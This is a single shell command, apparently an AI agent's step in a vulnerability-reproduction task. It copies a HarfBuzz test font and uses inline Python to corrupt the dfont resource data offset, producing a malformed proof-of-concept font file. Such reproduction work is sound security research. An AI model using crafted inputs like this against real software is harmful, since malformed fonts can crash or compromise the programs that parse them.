Command `cd /workspace && cp repo-vul/src-vul/harfbuzz/test/shaping/data/in-house/fonts/TestDFONT.dfont /workspace/poc_off1.dfont && python3 - <<'PY'
from pathlib import Path
import struct
p=Path('/workspace/poc_off1.dfont')
b=bytearray(p.read_bytes())
mapOff=struct.unpack('>I', b[4:8])[0]
tl=mapOff+struct.unpack('>H', b[mapOff+24:mapOff+26])[0]
res0=tl+struct.unpack('>H', b[tl+2+6:tl+2+8])[0]
b[res0+5:res0+8]=(1).to_bytes(3,'big')
p.write_bytes(b)
PY
